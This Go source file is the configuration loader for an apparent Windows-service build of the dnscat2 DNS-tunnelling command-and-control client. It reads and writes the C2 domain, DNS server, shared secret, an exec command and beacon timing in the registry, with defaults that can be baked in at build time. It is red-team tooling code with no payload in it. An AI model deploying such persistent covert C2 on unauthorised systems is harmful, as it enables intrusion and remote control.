package main

import (
	"fmt"
	"strconv"

	"golang.org/x/sys/windows/registry"
)

const (
	registryPath = `SYSTEM\CurrentControlSet\Services\dnscat2\Parameters`
)

// Build-time configurable defaults (can be set via -ldflags)
// Example: go build -ldflags="-X main.DefaultDnsServer=192.168.1.2 -X main.DefaultSecret=mysecret"
var (
	DefaultDomain        = ""
	DefaultDnsServer     = ""
	DefaultDnsPort       = "53"
	DefaultDnsTypes      = "TXT,CNAME,MX"
	DefaultSecret        = ""
	DefaultExecCommand   = ""
	DefaultDelay         = "1000"
	DefaultMaxRetransmit = "20"
	DefaultNoEncryption  = "false"
	DefaultPacketTrace   = "false"
)

// Config holds dnscat2 service configuration
type Config struct {
	Domain        string
	DnsServer     string
	DnsPort       uint
	DnsTypes      string
	Secret        string
	NoEncryption  bool
	Delay         int
	MaxRetransmit int
	PacketTrace   bool
	ExecCommand   string
}

// LoadConfigFromRegistry loads service configuration from Windows Registry
// Falls back to build-time defaults if registry keys are not available
func LoadConfigFromRegistry() (*Config, error) {
	// Initialize config with build-time defaults
	config := getDefaultConfig()

	// Try to open registry key - if it fails, use build-time defaults
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, registryPath, registry.QUERY_VALUE)
	if err != nil {
		// Registry key doesn't exist - check if build-time defaults are sufficient
		if config.Domain != "" || config.DnsServer != "" {
			// Build-time defaults are configured, use them
			return config, nil
		}
		return nil, fmt.Errorf("no registry configuration and no build-time defaults: %w", err)
	}
	defer k.Close()

	// Override defaults with registry values if present
	if domain, _, err := k.GetStringValue("Domain"); err == nil && domain != "" {
		config.Domain = domain
	}

	if dnsServer, _, err := k.GetStringValue("DnsServer"); err == nil && dnsServer != "" {
		config.DnsServer = dnsServer
	}

	if dnsTypes, _, err := k.GetStringValue("DnsTypes"); err == nil && dnsTypes != "" {
		config.DnsTypes = dnsTypes
	}

	if secret, _, err := k.GetStringValue("Secret"); err == nil && secret != "" {
		config.Secret = secret
	}

	if execCmd, _, err := k.GetStringValue("ExecCommand"); err == nil && execCmd != "" {
		config.ExecCommand = execCmd
	}

	if dnsPort, _, err := k.GetIntegerValue("DnsPort"); err == nil {
		config.DnsPort = uint(dnsPort)
	}

	if delay, _, err := k.GetIntegerValue("Delay"); err == nil {
		config.Delay = int(delay)
	}

	if maxRetransmit, _, err := k.GetIntegerValue("MaxRetransmit"); err == nil {
		config.MaxRetransmit = int(maxRetransmit)
	}

	if noEncryption, _, err := k.GetIntegerValue("NoEncryption"); err == nil {
		config.NoEncryption = noEncryption != 0
	}

	if packetTrace, _, err := k.GetIntegerValue("PacketTrace"); err == nil {
		config.PacketTrace = packetTrace != 0
	}

	// Validate configuration
	if config.Domain == "" && config.DnsServer == "" {
		return nil, fmt.Errorf("either Domain or DnsServer must be configured (in registry or build-time defaults)")
	}

	return config, nil
}

// getDefaultConfig returns a Config initialized with build-time defaults
func getDefaultConfig() *Config {
	config := &Config{
		Domain:       DefaultDomain,
		DnsServer:    DefaultDnsServer,
		DnsTypes:     DefaultDnsTypes,
		Secret:       DefaultSecret,
		ExecCommand:  DefaultExecCommand,
		NoEncryption: DefaultNoEncryption == "true",
		PacketTrace:  DefaultPacketTrace == "true",
	}

	// Parse numeric defaults
	if port, err := strconv.ParseUint(DefaultDnsPort, 10, 32); err == nil {
		config.DnsPort = uint(port)
	} else {
		config.DnsPort = 53
	}

	if delay, err := strconv.Atoi(DefaultDelay); err == nil {
		config.Delay = delay
	} else {
		config.Delay = 1000
	}

	if maxRetrans, err := strconv.Atoi(DefaultMaxRetransmit); err == nil {
		config.MaxRetransmit = maxRetrans
	} else {
		config.MaxRetransmit = 20
	}

	return config
}

// SaveConfigToRegistry saves configuration to Windows Registry
// This is a helper function for installation/configuration
func SaveConfigToRegistry(config *Config) error {
	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, registryPath, registry.ALL_ACCESS)
	if err != nil {
		return fmt.Errorf("failed to create registry key: %w", err)
	}
	defer k.Close()

	// Write string values
	if config.Domain != "" {
		if err := k.SetStringValue("Domain", config.Domain); err != nil {
			return err
		}
	}

	if config.DnsServer != "" {
		if err := k.SetStringValue("DnsServer", config.DnsServer); err != nil {
			return err
		}
	}

	if config.DnsTypes != "" {
		if err := k.SetStringValue("DnsTypes", config.DnsTypes); err != nil {
			return err
		}
	}

	if config.Secret != "" {
		if err := k.SetStringValue("Secret", config.Secret); err != nil {
			return err
		}
	}

	if config.ExecCommand != "" {
		if err := k.SetStringValue("ExecCommand", config.ExecCommand); err != nil {
			return err
		}
	}

	// Write DWORD values
	if err := k.SetDWordValue("DnsPort", uint32(config.DnsPort)); err != nil {
		return err
	}

	if err := k.SetDWordValue("Delay", uint32(config.Delay)); err != nil {
		return err
	}

	if err := k.SetDWordValue("MaxRetransmit", uint32(config.MaxRetransmit)); err != nil {
		return err
	}

	noEncryptionValue := uint32(0)
	if config.NoEncryption {
		noEncryptionValue = 1
	}
	if err := k.SetDWordValue("NoEncryption", noEncryptionValue); err != nil {
		return err
	}

	packetTraceValue := uint32(0)
	if config.PacketTrace {
		packetTraceValue = 1
	}
	if err := k.SetDWordValue("PacketTrace", packetTraceValue); err != nil {
		return err
	}

	return nil
}
